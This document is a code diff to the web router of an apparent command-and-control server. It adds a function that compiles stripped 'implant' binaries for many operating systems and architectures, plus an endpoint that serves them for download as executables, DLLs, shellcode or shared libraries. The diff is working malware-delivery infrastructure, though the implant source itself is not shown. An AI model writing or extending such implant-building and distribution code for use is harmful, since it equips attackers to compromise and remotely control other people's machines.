@@ -8,6 +8,9 @@ import (
 	"fmt"
 	"io/fs"
 	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -503,16 +506,54 @@ func NewRouter(implantServer *c2.ImplantServer, db *gorm.DB) http.Handler {
 				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON: " + err.Error()})
 				return
 			}
-			if payload.TargetOS == "" || payload.TargetArch == "" {
-				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "target_os and target_arch are required"})
+			if payload.TargetOS == "" {
+				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "target_os is required"})
 				return
 			}
-			payload.Status = "active"
-			if err := db.Create(&payload).Error; err != nil {
+
+			arch := payload.TargetArch
+			if arch == "" || arch == "auto" {
+				arch = "amd64"
+			}
+
+			archMap := map[string][]string{
+				"windows": {"amd64", "arm64", "386"},
+				"linux":   {"amd64", "arm64", "386", "mips", "mipsle", "riscv64"},
+				"darwin":  {"amd64", "arm64"},
+				"freebsd": {"amd64", "arm64"},
+				"ios":     {"arm64"},
+				"android": {"arm64", "arm"},
+			}
+
+			if arch == "multi" {
+				arches, ok := archMap[payload.TargetOS]
+				if !ok {
+					arches = []string{"amd64"}
+				}
+				var created []models.PayloadArtifact
+				for _, a := range arches {
+					p, err := buildImplant(db, payload, payload.TargetOS, a)
+					if err != nil {
+						writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: fmt.Sprintf("%s/%s: %v", payload.TargetOS, a, err)})
+						return
+					}
+					created = append(created, *p)
+				}
+				writeJSON(w, http.StatusCreated, created)
+				return
+			}
+
+			p, err := buildImplant(db, payload, payload.TargetOS, arch)
+			if err != nil {
 				writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
 				return
 			}
-			writeJSON(w, http.StatusCreated, payload)
+			writeJSON(w, http.StatusCreated, p)
+			return
+		}
+
+		if path == "download" {
+			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "specify payload ID: /api/payloads/{id}/download"})
 			return
 		}
 
@@ -538,7 +579,49 @@ func NewRouter(implantServer *c2.ImplantServer, db *gorm.DB) http.Handler {
 			return
 		}
 
-		if parts[1] == "revoke" {
+		if parts[1] == "download" {
+				if r.Method != http.MethodGet {
+					writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
+					return
+				}
+				var payload models.PayloadArtifact
+				if err := db.First(&payload, "id = ?", payloadID).Error; err != nil {
+					writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "payload not found"})
+					return
+				}
+				if payload.Status == "revoked" {
+					writeJSON(w, http.StatusForbidden, ErrorResponse{Error: "payload has been revoked"})
+					return
+				}
+				if len(payload.BinaryData) == 0 {
+					writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "no binary data available"})
+					return
+				}
+				ext := ""
+				switch payload.TargetOS {
+				case "windows":
+					switch payload.Format {
+					case "dll":
+						ext = ".dll"
+					case "shellcode":
+						ext = ".bin"
+					default:
+						ext = ".exe"
+					}
+				default:
+					if payload.Format == "shared" {
+						ext = ".so"
+					}
+				}
+				filename := fmt.Sprintf("implant-%s-%s%s", payload.TargetOS, payload.TargetArch, ext)
+				w.Header().Set("Content-Type", "application/octet-stream")
+				w.Header().Set("Content-Disposition", "attachment; filename=\""+filename+"\"")
+				w.Header().Set("Content-Length", strconv.Itoa(len(payload.BinaryData)))
+				w.Write(payload.BinaryData)
+				return
+			}
+
+			if parts[1] == "revoke" {
 			if r.Method != http.MethodPost {
 				writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
 				return
@@ -935,4 +1018,67 @@ func writeJSON(w http.ResponseWriter, status int, v interface{}) {
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(status)
 	json.NewEncoder(w).Encode(v)
+}
+
+func buildImplant(db *gorm.DB, base models.PayloadArtifact, goos, goarch string) (*models.PayloadArtifact, error) {
+	tmpDir, err := os.MkdirTemp("", "pc2-build-*")
+	if err != nil {
+		return nil, fmt.Errorf("create temp dir: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	ext := ""
+	if goos == "windows" {
+		ext = ".exe"
+	}
+	outPath := filepath.Join(tmpDir, "implant"+ext)
+
+	// Find project root (where go.work lives)
+	exePath, _ := os.Executable()
+	projectRoot := filepath.Dir(filepath.Dir(filepath.Dir(exePath)))
+	// Fallback: look for go.work by walking up from cwd
+	if _, err := os.Stat(filepath.Join(projectRoot, "go.work")); err != nil {
+		cwd, _ := os.Getwd()
+		for d := cwd; d != "/"; d = filepath.Dir(d) {
+			if _, err := os.Stat(filepath.Join(d, "go.work")); err == nil {
+				projectRoot = d
+				break
+			}
+		}
+	}
+
+	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-trimpath", "-o", outPath, "./cmd/implant/...")
+	cmd.Dir = projectRoot
+	cmd.Env = append(os.Environ(),
+		"GOOS="+goos,
+		"GOARCH="+goarch,
+		"CGO_ENABLED=0",
+	)
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return nil, fmt.Errorf("build failed: %s: %w", string(output), err)
+	}
+
+	binData, err := os.ReadFile(outPath)
+	if err != nil {
+		return nil, fmt.Errorf("read binary: %w", err)
+	}
+
+	hash := sha256.Sum256(binData)
+
+	payload := base
+	payload.ID = ""
+	payload.TargetOS = goos
+	payload.TargetArch = goarch
+	payload.Status = "active"
+	payload.SHA256 = hex.EncodeToString(hash[:])
+	payload.FileSize = int64(len(binData))
+	payload.BinaryData = binData
+
+	if err := db.Create(&payload).Error; err != nil {
+		return nil, fmt.Errorf("save payload: %w", err)
+	}
+
+	return &payload, nil
 }
